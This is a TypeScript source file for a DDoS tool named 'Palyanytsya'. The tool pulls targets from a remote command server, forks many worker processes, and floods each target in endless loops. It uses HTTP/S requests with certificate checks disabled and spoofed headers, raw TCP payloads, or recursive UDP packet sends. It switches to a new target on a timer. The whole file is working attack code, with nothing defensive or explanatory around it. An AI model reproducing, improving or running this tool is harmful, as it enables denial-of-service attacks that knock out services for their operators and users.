import got, { RequestError } from 'got-cjs';
import Colors from 'colors';
import * as DGram from 'dgram';
import delay from 'delay';
import net from 'net';
import cluster from 'cluster';
import { getDefaultHeaders, getSearchParams } from './util';
import { logError, logRainbow, logInfo, logSuccess } from './log';
import {
  PAYLOAD,
  HEX_PAYLOAD,
  WORKERS_COUNT,
  CHANGE_TARGET_DELAY_MIN,
  AVAILABLE_PROTOCOLS,
  FAILED_CODES,
  API_HOST,
  CONNECTION_TIMEOUT,
} from './constants';

interface Target {
  path: string;
  port: number | string;
  protocol: string;
}

class Palyanytsya {
  private target: Target | null = null;
  private working: boolean;
  private resetting = false;

  constructor () {
    this.working = false;
 
  }

  get targetProtocol (): string {
    const protocol = this?.target?.protocol ?? '';

    const isCorrectProtocol = AVAILABLE_PROTOCOLS.includes(protocol.toLowerCase());

    return isCorrectProtocol ? protocol.toLowerCase() : 'http';
  }

  get port (): string {
    const port = this?.target?.port ?? '';

    if (port === 'null' || !port) {
      switch (this.targetProtocol) {
        case 'http':
          return '80';
        case 'https':
          return '443';
        case 'udp':
          return '53';
        default:
          return '80';
      }
    }

    return String(port);
  }

  async loadTarget() {
    try {
      const response = await got.get(`${API_HOST}/targets/random-target`);
      
      this.target = JSON.parse(response.body) as Target;
      logInfo(`Start working with target ${this.target.path} on port ${this.target.port} via ${this.target.protocol} protocol.`);
    } catch (err) {
      logError('ERROR WHILE FETCHING TARGET');
      logError((err as Error).toString());
      throw new Error('ERROR WHILE FETCHING TARGET')
    }
  }

  async start () {
    this.working = true
    this.resetting = false;

    const delayToFindNewTarget = 1000 * 60 * CHANGE_TARGET_DELAY_MIN;

    if (cluster.isPrimary) {
      for (let i = 0; i < WORKERS_COUNT; i++) {
        cluster.fork();
      }
  
      cluster.on('exit', (worker) => {
          logInfo(`Threads ${worker.process.pid} stop`)
      });
    } else {
        logInfo(`Setup Threads ${process.pid}`);
        await delay(100);
        logInfo(`Start worker`);
        this.startWorker();
    }

    logSuccess('ALL WORKERS STARTED')

    setTimeout(() => {
      void this.restart();
    }, delayToFindNewTarget)
  }

  stop () {
    this.working = false
  }

  startWorker() {
    this.working = true;
    this.resetting = false;
    
    this.worker().catch(err => {
      logError(`Shit happens. Error while start worker. ${(err as Error).message}`)
    })
  }

  async restart () {
    console.log(this.resetting);
    if (this.resetting) return;
    this.resetting = true;
    this.working = false;

    logRainbow('Service restarting and trying to find new target.', 'RESTARTING');

    await delay(5000);
    await this.loadTarget();
    
    logRainbow('Service restarted. Target found!', 'RESTARTING');
    
    await delay(1000);

    setTimeout(()=>{
      this.startWorker();
    },0);
 
  }

  async httpAttack () {
    const path = this.target?.path ?? ''; 
    const targetPath = `${this.targetProtocol.trim()}://${path.trim()}${this.port ? `:${this.port.trim()}` : ''}`;

    try {
      await got.get(targetPath, {
        https:{
          rejectUnauthorized: false,
        },
        timeout: {
          send: CONNECTION_TIMEOUT,
          response: CONNECTION_TIMEOUT
        },
        headers: getDefaultHeaders(targetPath),
        searchParams: getSearchParams()
      });
      
      logInfo(`PID-[${process.pid}]-Date-[${new Date().toLocaleString('en-US', { hour12: false })}] - The payload has been send to ${targetPath} via ${this.targetProtocol.toUpperCase()} protocol.`);
    } catch (err) {
      console.log((err as RequestError).code);
      logError(`PID - [${process.pid}]: HTTP/S REQUEST - ${(err as RequestError)?.message}. Path: [${Colors.bgRed(targetPath)}]`);

      if (FAILED_CODES.includes((err as RequestError).code as string)) {
        await this.restart();
      }
    }
  }

  async tcpAttack () {
    const that = this;
    const client = new net.Socket();
    const { path = '' } = this.target || {}; 
    
    await delay(200);

    client.on('error', async () => {
      logError(`Error occurred while TCP attack`);
      await this.restart();
    });

    client.on('data', () => { // 'data' is an event handler for the client socket, what the server sent
      logInfo(`PID-[${process.pid}]-Date-[${new Date().toLocaleString('en-US', { hour12: false })}]-The payload has been send to ${path.trim()}${that.port ? `:${that.port}` : ''} via ${that.targetProtocol.toUpperCase()} protocol.`);
      client.destroy(); // Close the client socket completely
    }); 

    client.connect(Number(this.port), path.trim(), () => {
        console.log("Connected");
        client.write(HEX_PAYLOAD); //This will send the byte buffer over TCP
    });
  }

  async udpAttack () {
    const { path = '' } = this.target || {}; 
    const udpClient = DGram.createSocket('udp4');

    await delay(200);

    udpClient.on('error', () => {
      logError(`Error occurred while UDP attack`);
    });

    udpClient.send(PAYLOAD, Number(this.port), path.trim(), () => {
      udpClient.close();
    });

    logInfo(`PID-[${process.pid}]-Date-[${new Date().toLocaleString('en-US', { hour12: false })}]-The payload has been send to ${path.trim()}${this.port ? `:${this.port}` : ''} via ${this.targetProtocol.toUpperCase()} protocol.`);
    this.udpAttack().catch((err) => {
      logError(`UDP REQUEST - ${(err as Error)?.message}`);
    });
  }

  attack () {
    if (!this.target) {
      logError('Attack error. Target is wrong.');
      return;
    }

    const { protocol = '' } = this?.target || {};

    switch (protocol.toLowerCase()) {
      case 'tcp':
        void this.tcpAttack();
        break;
      case 'udp':
        void this.udpAttack();
        break;
      case 'http':
        void this.httpAttack();
        break;
      case 'https':
        void this.httpAttack();
        break;
      default:
        logError(`Can not start, please check protocol value. ${protocol} is wrong.`);
        break;
    }
  }

  async worker () {
    while (this.working) {
      await delay(100);
      setTimeout(() => {
        try {
          this.attack();
        } catch (err) {
          logError(`Error while performing request. ${(err as Error)?.message}.`);
          throw new Error();
        }
      }, 0);
    }
  }
}

export default Palyanytsya;
